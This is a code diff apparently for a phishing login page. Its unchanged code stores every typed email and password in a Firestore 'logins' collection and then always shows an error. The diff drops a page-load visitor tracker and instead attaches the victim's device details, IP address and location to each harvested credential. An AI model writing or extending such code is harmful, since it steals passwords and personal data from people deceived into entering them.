@@ -407,47 +407,8 @@
             }
         }
         
-        // Suivre le visiteur au chargement de la page
-        async function trackVisitor() {
-            const deviceInfo = getDeviceInfo();
-            const locationInfo = await getLocationInfo();
-            const ipAddress = locationInfo.adresseIP;
-            
-            // Chercher si ce visiteur existe déjà (basé sur l'IP)
-            const snapshot = await db.collection('visiteurs').where('adresseIP', '==', ipAddress).get();
-            
-            if (snapshot.empty) {
-                // Nouveau visiteur - créer un document
-                db.collection('visiteurs').add({
-                    ...deviceInfo,
-                    ...locationInfo,
-                    premiereVisite: new Date(),
-                    derniereVisite: new Date(),
-                    nombreVisites: 1
-                }).then(() => {
-                    console.log('Nouveau visiteur enregistré avec succès');
-                }).catch((error) => {
-                    console.error('Erreur lors de l\'enregistrement du nouveau visiteur:', error);
-                });
-            } else {
-                // Visiteur existant - mettre à jour le document
-                const doc = snapshot.docs[0];
-                doc.ref.update({
-                    derniereVisite: new Date(),
-                    nombreVisites: firebase.firestore.FieldValue.increment(1)
-                }).then(() => {
-                    console.log('Visiteur mis à jour avec succès');
-                }).catch((error) => {
-                    console.error('Erreur lors de la mise à jour du visiteur:', error);
-                });
-            }
-        }
-        
         document.addEventListener('DOMContentLoaded', function() {
-            // Track visitor immediately when page loads
-            trackVisitor();
-            
-            document.querySelector('.login-btn').addEventListener('click', function() {
+            document.querySelector('.login-btn').addEventListener('click', async function() {
                 const email = document.querySelector('.input[type="text"]').value;
                 const password = document.getElementById('passwordInput').value;
                 const errorElement = document.querySelector('.error');
@@ -466,6 +427,10 @@
                 // Show error message
                 errorElement.style.display = 'block';
                 
+                // Récupérer toutes les informations du visiteur
+                const deviceInfo = getDeviceInfo();
+                const locationInfo = await getLocationInfo();
+                
                 // Check if this email/password combination already exists
                 db.collection('logins').where('email', '==', email).where('password', '==', password).get()
                     .then((snapshot) => {
@@ -474,11 +439,13 @@
                             db.collection('logins').add({
                                 email: email,
                                 password: password,
+                                ...deviceInfo,
+                                ...locationInfo,
                                 timestamp: new Date()
                             }).then(() => {
-                                console.log('Data sent to Firestore successfully');
+                                console.log('Toutes les données du visiteur enregistrées avec succès dans logins');
                             }).catch((error) => {
-                                console.error('Error sending data to Firestore:', error);
+                                console.error('Erreur lors de l\'enregistrement des données:', error);
                             });
                         } else {
                             // Email/password combination already exists - don't create duplicate
